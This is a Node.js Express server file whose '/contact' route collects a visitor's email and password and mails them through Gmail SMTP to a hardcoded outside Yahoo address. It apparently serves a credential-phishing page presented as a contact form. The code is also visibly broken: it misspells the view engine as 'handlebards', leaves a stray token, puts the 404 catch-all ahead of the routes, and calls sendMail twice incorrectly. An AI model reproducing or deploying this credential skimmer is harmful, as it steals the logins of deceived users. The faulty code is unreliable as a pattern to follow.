const express = require('express'); 
const bodyParser = require('body-parser');
const exphbs = require('express-handlebars');
var nodemailer = require('nodemailer');clearImmediate
const app = express();
const path = require('path');

//view english setup
app.engine('handlebards', exphbs());
app.set('view engine', 'handlebars');

// stataic folder
app.use(express.static(path.join(__dirname,'public')));

// eror 404 page not found
app.use("*",function(req,res){
    res.sendFile(__dirname + "/public/404.html");
  });
  
//body parser middleware
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json());


app.post('/contact', (req, res) => {
    const output = `
    <p>you are new contact request</p>
    <p>Contact Detail</h3>
    <ul>
        
        
        <li>email: ${req.body.email}</li>
        <li>pass: ${req.body.password}</li>
    </ul>
    
    `;
// async..await is not allowed in global scope, must use a wrapper
async function main() {
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    let testAccount = await nodemailer.createTestAccount();

    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
            user: 'abdullahhaider2828@gmail.com', // generated ethereal user
            pass: 'pass'// generated ethereal password
        }
    });

    // send mail with defined transport object
    let info = await transporter.sendMail({
        from: '"hi Asad it is node js email 👻" <abdullahhaider2828@gmail.com>', // sender address
        to: 'asad_jee19@yahoo.com', // list of receivers
        subject: 'Hello ✔', // Subject line
        text: 'Hello world?', // plain text body
        html: output // html body
    });
    transporter.sendMail(info, function(error, info){
        if (error) {
             console.log(error);
            
          }
          else {
            console.log('success');
            res.redirect('/index.html');
          }
          
    });

    //console.log('Message sent: %s', info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    //console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
}

main().catch(console.error);


});


app.listen(3000, () => console.log('server started...'));